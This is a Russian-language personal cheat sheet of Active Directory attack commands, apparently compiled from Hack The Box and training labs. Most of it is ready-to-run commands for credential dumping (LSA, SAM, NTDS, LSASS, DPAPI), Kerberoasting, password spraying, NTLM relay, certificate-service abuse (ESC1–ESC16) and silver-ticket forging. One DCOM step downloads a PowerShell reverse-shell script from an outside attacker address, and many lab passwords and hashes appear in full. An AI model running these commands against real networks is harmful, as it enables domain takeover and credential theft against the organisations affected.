# Domain
	1. Основная самая лучшая справка по Active Directory:
	https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg

	2. Основные утилиты, которые необходимы (и на которые стоит обратить внимание в гите выше):
	1) nmap / masscan
	2) netdiscover
	3) nxc (netexec) - лучший швейцарский нож, который умеет делать почти всё.
	4) impacket - отсюда иногда нужна небольшая группа утилит на полуение билетов. В целом остальное умеет всё nxc.
	5) certipy-ad - атаки на ADCS.
	6) ntlmrelayx
	7) утилиты на конткретные уязвимости: "zerologon", "printnightmare", "ms17-010", coerce-уязвимости ("petitpotam", "printerbug"). Чаще всего это либо metasploit, либо скрипты с гитхаба.
	8) утилита для атаки timeroasting (timeroast.py).
	9) связка утилиты nxc --bloodhound + bloodhound + ADMiner
	10) утилиты rubeus, bloodyad, mimikatz для локального повышения привилегий (если попали на машину не админом).
	11) утилиты responder для перехвата NetNTLM-хешей

	3. По уязвимостям и инструментам что следует почитать:
	1) Документацию по утилите netexec: https://www.netexec.wiki
	2) Уязвимости по ACDS (для утилиты certipy):
	https://habr.com/ru/companies/jetinfosystems/articles/846066/
	https://habr.com/ru/companies/pt/articles/916888/
	3) Курс по Kerberos:
	https://ardent101.github.io
	4) Документация по Impacket:
	https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/
	и пример использования: https://habr.com/ru/companies/ruvds/articles/743444/
	5) Цикл статей на использование NTLM-Relay:
	https://habr.com/ru/companies/otus/articles/745648/
	6) Некоторые атаки на AD, только утилиты не смотрите. Почти всё умеет делать nxc:
	https://codeby.net/threads/10-metodov-atak-na-active-directory-uglublennyi-razbor-i-zashchita.85281/

	Общий сценарий:
	1) Сканим сеть на порты + пробуем трансфер зоны DNS, перебор PTR DNS записей + responder.
	2) Если поймал Responder хеши - в брут (перебор) на видеокартах.
	3) Основная цель - найти первую учетку.
	Null-session, guest(Гость), пробуем найти pre2k-машины (когда логин и пароль машинных учетных записей совпадают), пробуем выгрузить логины. 
	4) Если учетки получили, можно попробовать:
	- подобрать пароль (password spraying) ~ 1 попытка в 10 минут, чтобы не заблокировать. К примеру пустые пароли, пароль = логину, пароль 123.
	- пробуем ASREPRoasting. 
	5) Если учеток нет - ищем уязвимые машины в сети (VNC, telnet, web-уязвимости, иные уязвимости).
	6) Если добыли учетку - сгружаем BloodHound, строим дополнительно отчет в ADMiner (лично мне нравится оно), ппросто изучаем куда можно ходить с RDP, можем ли RDCD/Constrained/Unonstrained делегирование.
	Заново запрашиваем pre2k.
	Обходим все машины на поиск coerce-уязвимостей.
	Дальше только просто анализировать отношения между учетными записями и что/где мы можем сделать. 

	Собственно чаще всего самое сложное - найти первую учетку.
	Дальше - придумать как поднять права (RDP / nxc / доступ к шарам + rubeus, bloodyad, mimikatz)

# DOMAIN


# Check list domain
		
		# Blue Kipper
		msfconsole
		use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
		set RHOSTS <target_ip>
		run

		* Создание krb5.conf и получение tgt и кербероастинг с помощью nxc (https://github.com/Pennyw0rth/NetExec)

		(получение krb5.conf) nxc smb dc01.mirage.htb -d mirage.htb -k --generate-krb5-file krb5.conf
		sudo mv krb5.conf /etc/krb5.conf
		
  		(asreproasting)	nxc ldap -u users.txt -d mirage.htb -k --asreproast asreprotuser.txt dc01.mirage.htb
		(керберостинг с nxc) nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb

  		(получение tgt) nxc smb -u nathan.aadam -p '3edc#EDC3' -d mirage.htb -k --generate-tgt nathan.aadam dc01.mirage.htb
		(чтение GMSA)  nxc ldap -u javier.mmarshall -p 'Password123' -k --gmsa dc01.mirage.htb
		
 		(Нахождение делегирования)  nxc ldap  10.10.11.78 -u mark.bbond -p '1day@atime' -k --trusted-for-delegation --find-delegation   

   		(поиск центра сертификации)	crackmapexec ldap 'dc.sequel.htb' -d 'sequel.htb' -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs  	
  		
		(Уязвимые для атак перенаправления серверы )	nxc smb 10.10.1.50 -u kemг -p password -M coersce_plus		
		
		nxc smb dc1.corp.com -u '' -p '' -M zerologon

		nxc smb dc1.corp.com -u '' -p '' -M printnightmare

		(скрипт проверки найтмор)	/printnightmare -check dc.com.com/user\@termit-win(хост) -no-pass -k 		

		(список компов с)	/printnightmare -list dc.com.com/user\@termit-win(хост) -no-pass -k		

		(CVE-2020-0796, также известная как SMBGhost )	nxc smb dc1.corp.com -u '' -p '' -M smbghost		

		(petip potam)	nxc smb dc1.corp.com -u '' -p '' -M coerce_plus	

		(квота машин в домене)	nxc ldap dc1.corp.com -u 'user' -p 'passs' -k --use-kcache -M maq	

		(проверяем нопак)	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
		
		(LDAP Relay и подписи)	nxc ldap dc1.corp.com -u 'user' -p 'passs' -k --use-kcache -M ldap-checker		

		(атака Pre2k)	nxc ldap dc_control.do.com -u 'comp' -k --use-kcache -M pre2k		

		(посмотреть все компы в сети) nxc smb <dc> -u '' -p '' --conpeters

		(атака timeroasting)	nxc smb rustykey.htb -M timeroast

		(поиск антивирусов)	nxc smb dc1.corp.com -u 'administrator' -p 'password' -M enum_av		

		(дамп хранилища Lsa)	nxc smb dc1.corp.com -u 'administrator' -p 'password' --lsa			(дамп хранилища Lsa)

		nxc smb dc1.corp.com -u 'administrator' -p 'password' --sam

		nxc smb dc1.corp.com -u 'administrator' -p 'password' --ntds --user krbtg

		(тоже)	nxc smb dc1.corp.com -u 'administrator' -p 'password' -M ntdsutil  	

		(тоже)	nxc smb dc1.corp.com -u 'administrator' -p 'password' -M lsassy	

		(тоже но скрытнное)	nxc smb 10.10.11.76 -u user -p pass -M nanodump		

		((получение кредов из браузеров))	mxc smb ss.banki.htb -u boss -p "password" -d banki.htb --dpapi			
  					https://github.com/login-securite/DonPAPI

		(пароли локальных администраторов)	nxc ldap dc -u administrator -p password -d . -M laps		
		
		(получить sid домена)	nxc ldap dc1.corp.com -u 'administrator' -p 'password' -k --get-sid	

  		 (брутит пользователей домена)	nxc smb razor.thm -u wili -p poteto --rid-brute

		(Показать всех пользователей домена)	nxc smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --users  

		(показать ктов группе)	proxychains -q nxc ldap 172.16.19.3 -u jimmy -p 'jimmy_001' --groups "src_management" 
  		
		(показать инфо о пользователе)	nxc ldap 172.16.19.3 -u jimmy -p 'jimmy_001' --users jimmy		
		
		(используя модуль spider_plus просмотреть шары и скачать /tmp/nxc_hosted/nxc_spider_plus/<IP-адрес_цели>/)
	nxc smb 10.10.10.10 -u 'user' -p 'password' -M spider_plus --spider SYSVOL --spider-folder Policies -o DOWNLOAD_FLAG=True 
	
		 (нахождение локальных админов)  crackmapexec smb 192.168.50.110 -u 'Administrator' -p 'Password321' --local-auth 
		  
		(Пользователи залогиненные на компе)	sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users 


	
* clock sync

		faketime "$(ntpdate -q voleur.htb | awk '{print $1" "$2}')" bash      (меняем время прям в терм)

		sudo timedatectl set-ntp off
		sudo timedatectl set-ntp false 
		sudo timedatectl set-time '20:20:10'
		sudo date --set="2022-01-01 12:00:00"
  		sudo net time set -S 10.10.11.181
  		sudo ntpdate
		sudo ntpdate -s 10.10.10.248 
* Pre2k

  		nxc ldap dc_control.do.com -u 'comp' -k --use-kcache -M pre2k
  
* Timeroast

  	  nxc smb rustykey.htb -M timeroast 
		Можно руками выписать тикеты в файл hash.txt, но я сделал это вот такой командой:

		nxc smb rustykey.htb -M timeroast | grep -oP '\d+:\$sntp-ms\$[^\s]+' > hash.txt
		cut -d ':' -f2- hash.txt > clean_hash.txt
		Для брутфорса этого режима нам понадобится beta-версия hashcat, скачаем и установим ее:

		mkdir -p ~/apps/hashcat-beta
		cd ~/apps/hashcat-beta
		wget https://hashcat.net/beta/hashcat-6.2.6%2B1051.7z
		7z x hashcat-6.2.6+1051.7z
		Теперь запустим брутфорс тикетов и получим пароль от RID 1125 — IT-COMPUTER3:

		$ ~/apps/hashcat-beta/hashcat-6.2.6/hashcat.bin -a 0 -m 31300 clean_hash.txt /usr/share/wordlists/rockyou.txt
		$sntp-ms$10bd1bdf13cc0f08fc665434ba9b0211$1c0111e900000000000a14f74c4f434cec0ba8b241da597de1b84

* Shares Enum (smb/cifs/nfs)

  		crackmapexec smb 192.168.2.123 -p '' -u '' --shares
  		crackmapexec smb 192.168.2.123 -p 'jksdfhgv' -u '' -M spider_plus
		nxc smb -d voleur.htb --use-kcache dc.voleur.htb --share IT --get-file "First-Line Support/Access_Review.xlsx" Access_Review.xlsx
  
  		cat 192.168.134.10.json | jq '. | map_values(keys)'
  		crackmapexec smb hosts_r.txt -u '' -p '' --get-file \\kanban\pkb.zip pkb.zip
		
  		Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1



  		* Кроме smb cifs ---> NFS На порту 2049 (UDP) видим NFS.
  		showmount -e mirage.htb 

  		Я воспользуюсь nfsshell:

		# соберем nfsshell
		sudo apt install libreadline-dev libtirpc-dev -y
		git clone https://github.com/Supermathie/nfsshell
		cd nfsshell
			make
		sudo mv nfsshell /usr/local/bin
		cd ..
			rm -rf nfsshell
		Скачаем файлы с NFS:

		$ nfsshell
		nfs> host mirage.htb
		nfs> dump
		10.10.10.40:/MirageReports
		10.10.10.40:/nfs_share
		nfs> mount MirageReports
		nfs> ls 


   
* Trasfer DNS ZONE and DNS recon

		nslookup -type=SRV _ldap._tcp.dc._msdcs.dgg.tgg.zazpbom.ru 	(домен dgg.tgg.zazpbom.ru - поиск контроллеров домена)
		Общее перечисление SRV-записей с контроллера домена dc2.dgg.game.ru
  		nslookup -type=SRV _ldap._tcp.dc._msdcs.game.ru			(game.ru) домен

  		dig @10.10.11.5 freelancer.htb axfr		(dns-server   domain)
		dig @<ip> <домен> NS
  		Смотрим в DNS  в ptr записи:

  		dnsrecon -r 192.168.0.0/16  -n 192.168.2.11 - (dns server) 	(Обратный обход (Reverse Lookup) диапазона IP-адресов для поиска PTR-записей)

		dnsrecon -d bank.htb -a -n 192.168.2.37 -(dns server)	(Метод «прямого запроса»: Запрашивает у конкретного DNS-сервера полную копию его зоны для домена.)
		1) Смотрим в DNS  в ptr записи: dnsrecon -r 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (но поочереди)

		sudo arp-scan --localnet 		(arp сканирование сети)

		 nslookup
		> server 10.10.10.248
		Default server: 10.10.10.248
		Address: 10.10.10.248#53
		> svc_int.intelligence.htb
		Server:         10.10.10.248
		Address:        10.10.10.248#53
*******************************************************
		vim /etc/hosts/ ----> 10.129.203.6 inlanefreight.htb
		subfinder -d inlanefreight.com -v
		git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
		cd subbrute
		echo "ns1.inlanefreight.com" > ./resolvers.txt
		./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt

*******************************************************
		dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 			10.10.10.248 -a add -r web1 -d 10.10.14.58 -t A (создание ДНС записи в домене)

* Recon Lan

  		fping -ag 10.129.203.0/24
  		sudo netdiscover -r 10.129.203.0/24
		sudo netdiscover -i eth0
		
  		sudo masscan -p1-1000 10.129.203.0/24 --rate=1000
  		sudo masscan -p1-1000 10.129.203.6 -oG masscan_results.txt

		# В формате XML
		sudo masscan -p1-1000 10.129.203.6 -oX masscan_results.xml

		# В формате JSON
		sudo masscan -p1-1000 10.129.203.6 -oJ masscan_results.json

		# Вывод только открытых портов
		sudo masscan -p1-1000 10.129.203.6 --open-only

		# Извлечение только IP и портов
		grep "open" masscan_results.txt | awk '{print $4, $3}'

		# Извлечь IP:порт для последующего сканирования Nmap
		grep "open" masscan_results.txt | awk -F" " '{print $4}' | awk -F"/" '{print $1}' > nmap_targets.txt
		# Затем использовать с Nmap
		nmap -sV -sC -iL nmap_targets.txt -oA scan_results

* DNS resolver
  
		Файл /etc/resolv.conf — это конфигурационный файл DNS-резолвера
  			nameserver 10.28.16.3
			nameserver 10.28.16.1
			search dgg.zazrom.htb
  
  			nameserver 10.28.16.3 и nameserver 10.28.16.1 (Это IP-адреса DNS-серверов, которые ваша система использует для разрешения доменных имен.
			Система будет обращаться к ним в порядке очередности: сначала к 10.28.16.3, если он недоступен — к 10.28.16.1.)
 		 	search dgg.zazrom.htb -резлв коротких имен
		
* user found
		- with Kerbrute

		https://github.com/insidetrust/statistically-likely-usernames (списки юзеров)
		sudo git clone https://github.com/ropnop/kerbrute.git (репозиторий кербрут)

  		kerbrute userenum --dc 172.16.5.5 -d INLANEFREIGHT.LOCAL /opt/jsmith.txt (пример комманды)

 		- with crackmapexec
  
		crackmapexec smb 10.10.10.10 -p "anonymous" -p '' --rid-brute
		
		- with RPCCLIENT

		rpcclient -U '' -N  10.10.10.169
    
* MultiCast enum

		sudo responder -I ens224
  		(ответ собирается в /usr/share/responder/logs)

* kerbrute
    		
		~/kerbrute_linux_amd64 userenum users.txt --dc 192.168.50.110 -d vd.local
* not_preauth

  		impacket-GetNPUsers -dc-ip 192.168.50.110 vd.local/ -usersfile users.txt | grep '$krb'
		.\Rubeus.exe asreproast /user:carole.rose /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap
  		-----Kerberoasting without credentials

  		python3 -m venv impacket-fork
		source ./impacket-fork/bin/activate
		git clone https://github.com/ThePorgs/impacket.git
		cd impacket
		python3 setup.py install

		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231

* validate creds

		rdp, winrm, smb
   		crackmapexec rdp 192.168.50.110 -u 'nancy.carline' -p 'cowboys'

* local admin
  
		crackmapexec smb 192.168.50.110 -u 'Administrator' -p 'Password321' --local-auth 

* Users auth on host

  		sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
  
* Password policies
   
		crackmapexec smb 192.168.50.110 -u 'albertina.albertina' -p animal --pass-pol 
* Password Spray

  		crackmapexec smb 192.168.50.110 -u users.txt -p passwords.txt --continue-on-success

  		(in windows)
  		https://github.com/dafthack/DomainPasswordSpray

  		Import-Module .\DomainPasswordSpray.ps1
		Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
  
* Ldapdomaindump (1 05)

		ldapdomaindump -u 'vd.local\albertina.albertina' -p animal 192.168.50.110 
		from users.json bloodhount 
		cat 20240201210210_users.json|jq '.data[].Properties | .samaccountname + ":" + .description' -r

* Description whitch RPCCLIENT

  		rpcclient -U '' -N  10.10.10.169                                                 
		rpcclient $> querydispinfo
  
* Change Password

 	   	impacket-changepasswd 'vd.local/lamont.sibeal:passwd'@192.168.50.110 -newpass 'Password123'

* Bloodhoundlist 

		bloodhound-python -d vd.local -u lamont.sibeal -p Password123 -c all --dns-tcp -ns 192.168.50.110
		bloodhound-python -d htb.local -ns 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -c all
		bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc dc01.rebound.htb --zip -c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -ns 10.10.11.231
		
		Запуск

		cd /usr/bin && sudo ./neo4j console

		cd /home/max/BloodHound-linux-x64_new && ./BloodHound --no-sandbox
  
  		cat 20240201210210_users.json|jq '.data[].Properties | .samaccountname + ":" + .description' -r
* spn (Kerberoasting)
  
		----ntlm

  		impacket-GetUserSPNs -dc-ip 192.168.50.110 vd.local/arly.ayn:Password123 -request

  		-----kerberos
  
		impacket-getTGT voleur.htb/ryan.naylor:HollowOct31Nyt
		export KRB5CCNAME=ryan.naylor.ccache
		impacket-GetUserSPNs -dc-ip 10.10.11.76 -dc-host dc.voleur.htb voleur.htb/ryan.naylor -k -no-pass -request
				---nxc -делает все
  		nxc ldap dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --kerberoasting kerberoastables.txt

  		.\Rubeus.exe kerberoast /stats

  		.\Rubeus.exe kerberoast /nowrap /tgtdeleg
	

* DCOM Abusing

  		impacket-dcomexec -object MMC20 -silentcommand -debug jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell.exe Invoke-WebRequest -Uri http://10.10.14.94:80/Invoke-PowerShellTcp.ps1 -OutFile C:\Windows\TEMP\shell.ps1'   (выполнение комманд - загрузка скрипта)

  		impacket-dcomexec -object MMC20 -silentcommand -debug jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell.exe C:\Windows\TEMP\shell.ps1'


# Получение NTLM на основе сертификата пользователя
	#Запрос сертификатата для user

 		.\Certify.exe._obf.exe request /ca:DC01\mist-DC01-CA /template:user
		openssl pkcs12 -in brandon.keywrap.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
  		mv cert.pfx brandon.keywrap.pfx 
		
  		.\Rubeus.exe._obf.exe asktgt /user:brandon.keywarp /certificate:brandon.keywrap.pfx /getcredentials /show /nowrap


# Проверка сертификатов
*** Поиск центра сертификации

		crackmapexec ldap 'dc.sequel.htb' -d 'sequel.htb' -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
		crackmapexec ldap 172.16.117.3 -u administrator -H d1e532fdcdea711011a6b13bcf390401 -M adcs -o SERVER=INLANEFREIGHT-DC01-CA  (поиск шаблонов сертификатов)
	Копирование корневого сертификата (если есть права)
	certutil -exportPFX my "Certificate-LTD-CA" ca.pfx	(Certificate-LTD-CA - из вывода certipy)
*** Поиск уязвимых шаблонов
  		
    		https://github.com/ly4k/Certipy?tab=readme-ov-file

    		pip3 install -U certipy-ad
		
  		certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout (проверка уязвимых сертификатов)
 		
		certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout		(работает)


		certipy-ad find -enabled -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222
		сertipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip '10.10.11.202' -vulnerable -stdout -debug
		
		.\Certify.exe find /vulnerable

  ****** создает поддельный сертификат, используя доверенный корневой сертификат CA

  	certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject "CN=Administrator,CN=Users,DC=certificate,DC=htb" -out administrator.pfx
	certipy auth -pfx administrator.pfx -dc-ip $(cat /etc/hosts | grep certificate.htb | cut -d ' ' -f 1)
  

  
*** ESC1 - 1. Запрс сертификата для administrator

		.\certify request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
		& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


  		certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -debug

		ESC1 - 2. Получаем TGT и хеш администратора на основе сертификата

		.\rubeus asktgt /user:administrator /certificate:administrator.pfx /getcredentials /nowrap

				Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
				cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
				PS C:\Tools> Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add"
				
		certipy-ad auth -pfx administrator.pfx
  		
		certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199

*** ESC3 - запрос сертификата на основании другого сертификата

		certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC3 -dc-ip 10.129.56.123		(создаем сертификат)

		certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx 	(запрашиваем сертификат на основе другого сертификата)
 
		certipy-ad req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\haris' -pfx blwasp.pfx -dc-ip 10.129.56.123
		
  		certipy-ad auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.56.123

		export KRB5CCNAME=administrator.ccache
		
		impacket-smbexec -k -no-pass LAB-DC.LAB.LOCAL

		certipy-ad auth -pfx sql.pfx
  
*** ESC4 - возможность изменить шаблон сертификата чтобы использовать его как ESC1
			
   		certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
	 	certipy template -u 'BlWasp@lab.local' -p 'Password123!' -template ESC4 -save-old		(меняем в шаблоне все мешающие флаги)
		certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC4 -upn Administrator
  		certipy auth -pfx administrator.pfx -username Administrator -domain lab.local
		certipy template -u 'BlWasp@lab.local' -p 'Password123!' -template ESC4 -configuration ESC4.json 	(вернем шаблон обратно)

*** ESC5	Чтобы злоупотреблять ESC5, нам необходимо иметь права на учетную запись, которая имеет привилегии на объекты AD- local ADMINISTRATOR ADCS, включая (но не ограничиваясь ими):

    Компьютерный объект AD сервера CA - Администратор локальный  (т. е. компрометация через S4U2self или S4U2proxy).
    Сервер RPC /DCOM сервера CA.
    Любой дочерний объект AD или контейнер в контейнере CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM> (например, контейнер шаблонов сертификатов, контейнер центров сертификации, объект NTAuthCertificates, контейнер Служб регистрации и т.д.

	Certipy не указывает, что пользователи группы локальных администраторов имеют повышенные права на сервер ADCS. 
 
 Однако, как локальные администраторы, мы можем злоупотреблять ESC4, ESC7

	ssh -N -f -D 1080 htb-student@10.129.205.205   HTB_@cademy_stdnt!

	proxychains -q netexec smb 172.16.19.3-5 -u cken -p Superman001
	proxychains -q certipy-ad find -u cken -p Superman001 -dc-ip 172.16.19.3 -vulnerable -stdout -ns 172.16.19.3 -dns-tcp

	Запросить сертификат SubCa от имени администратора домена 
	proxychains -q certipy-ad req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -template SubCA -upn Administrator

	Wrote private key to '13.key'

	утверждаем предыдущий запрос
	proxychains -q certipy-ad ca -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -issue-request 13

	Извлеките сертификат выпуска
	proxychains -q certipy-ad req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 13

	proxychains -q certipy-ad auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp

	Аутентификация с помощью сертификата администратора 
	proxychains4 -q certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp


*** ESC 6 - Ошибка центра сертификации

  		certipy req -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.228.236 -target LAB-DC.lab.local -ca 'lab-LAB-DC-CA' -template 'User' -upn 'administrator@lab.local'
		certipy auth -pfx administrator.pfx -dc-ip 10.129.228.236

*** ESC 7 - Уязвимого контроля доступа Центра сертификации (просим серт на который нет прав и утверждаем его)
				
	certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.228.236 -vulnerable -stdout
		certipy find -u 'blwasp@lab.local' -p 'Password123!' -stdout (найти SubCA )

  		certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -add-officer BlWasp		(добавить ManageCertificates)
	mxdelta@htb[/htb]$ certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template SubCA -upn Administrator (ложный запрос сертификата - сохранит кей и номер его)
	certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 31 (номер ключа) (выдать сертификат)
		certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 31
 	*******************************************************

  
	********если есть ManageCertificates но нет ManageCA********
 
 	если я тебе пришлю все шаблоны - ты поможешь найти нужный шаблон и написать коммнады для ESC7?

	proxychains -q certipy-ad find -u jimmy -p jimmy_001 -dc-ip 172.16.19.3 -vulnerable -stdout

	VPN_Users
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    
    WebServer
    Machine
    User
    SubCA
    Administrator
    


	proxychains -q certipy-ad req -u jimmy -p 'jimmy_001' -ca lab-WS01-CA -dc-ip 172.16.19.5 -template VPN_Users -upn administrator@lab.local
	proxychains -q certipy-ad ca -u jimmy -p 'jimmy_001' -ca lab-WS01-CA -issue-request 18 -dc-ip 172.16.19.5
	proxychains -q certipy-ad req -u jimmy -p jimmy_001 -dc-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 18
	proxychains -q certipy-ad auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 172.16.19.3 -dns-tcp
	proxychains -q nxc smb 172.16.19.3  -u administrator -H 61208396569628a7a987d1dadb7683bb
 

*** ESC8 - Сертификат рилей

		sudo certipy-ad relay -target dc.domain.local -ca domain-DC-CA-1  -template Machine  (DomainController - если атака на dc b jy hfpytcty c ADCS)
		coercer coerce -l 192.168.134.24(listener_host) -t 192.168.134.12 (target) -u s.ivanov -p Venturers2004 -d domain.local -v
		certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3  (чтобы получить NT hash)
  		Затем делаем СЕРЕБРЯННЫЙ БИЛЕТ
    		lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :3d3a72af94548ebc7755287a88476460 (узнаем SID домена)
      		Создаем СЕРЕБРЯННЫЙ БИЛЕТ в качестве Администратора
      		ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
		и заходим....
  		KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.inlanefreight.local

*** ESC 9 	
		Сменим почту d.baker​ на h.brown@scepter.htb​:
		
   		bloodyAD -d scepter.htb -u a.carter -p Password123 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
		
  		certipy req -username "d.baker@scepter.htb" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
		
  		certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip $(cat /etc/hosts | grep scepter.htb | cut -d ' ' -f 1) -username h.brown

*** ESC 10   	

		чтобы проверить esc 10 пишем	
			reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v CertificateMappingMethods
   			
	  должно быть
			HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
 		   CertificateMappingMethods    REG_DWORD    0x4
	  
*** ESC 11
		
  		certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA" (рилеим еа CA но по RPC)
  		Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'nports' -d inlanefreight.local -v --hashes aad3b435b51404eeaad3b435b51404ee:ac49e22c2d9bf1e154aef4081300273b --always-continue
    		certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3  (чтобы получить NT hash)
		Затем делаем СЕРЕБРЯННЫЙ БИЛЕТ
		lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :3d3a72af94548ebc7755287a88476460 (узнаем SID домена)
  		Создаем СЕРЕБРЯННЫЙ БИЛЕТ в качестве Администратора
  		ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
		и заходим....
		KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.inlanefreight.local
*** ESC 16 
		Прочитаем атрибуты пользователя CA_SVC
  		certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69
    		
		Поменяем UPN на administrator​:
		certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update

		И теперь выпишем себе тикет на нужного пользователя administrator​:
  		certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
    
    		Теперь важно вернуть обратно UPN на изначальный:
		certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update

		
		И последним шагом достаем хеш пользователя administrator​:
  		certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69

		evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
    
*** Certifried (CVE-2022-26923) до мая 2022 года
  
			смотрим [*] Certificate has no object SID???
  
